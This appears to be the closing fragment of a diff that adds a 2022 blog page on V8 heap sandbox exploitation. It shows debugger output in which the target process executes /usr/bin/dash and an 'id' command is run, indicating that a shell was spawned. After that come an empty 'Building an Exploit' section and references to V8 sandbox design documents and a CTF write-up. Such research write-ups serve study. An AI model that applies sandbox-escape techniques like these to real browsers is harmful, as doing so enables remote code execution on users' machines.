+[Thread 0x7f07a5164700 (LWP 288624) exited]
+process 288620 is executing new program: /usr/bin/dash
+$ id
+</code></pre><h3 id=building-an-exploit>Building an Exploit<a href=#building-an-exploit class=hanchor arialabel=Anchor>&#8983;</a> </h3>
+<p>&mldr;</p>
+<h2 id=references>References<a href=#references class=hanchor arialabel=Anchor>&#8983;</a> </h2>
+<ul>
+<li><a href=https://docs.google.com/document/d/1FM4fQmIhEqPG8uGp5o9A-mnPB5BOeScZYpkHjo0KKA8>V8 Sandbox - High-Level Design Doc</a></li>
+<li><a href=https://docs.google.com/document/d/1V3sxltuFjjhp_6grGHgfqZNK57qfzGzme0QTk0IXDHk>V8 Sandbox - External Pointer Sandboxing</a></li>
+<li><a href=https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html>Dice CTF Memory Hole: Breaking V8 Heap Sandbox</a></li>
+</ul>
+</div></div>
+</div>
+</div>
+<footer class=footer>
+<div class=footer__inner>
+<div class="copyright copyright--user">
+<span>Anvbis &copy; 2022</span>
+</div>
+</div>
+</footer>
+<script src=https://anvbis.github.io/assets/main.js></script>
+<script src=https://anvbis.github.io/assets/prism.js></script>
+</div>
+</body>
+</html>
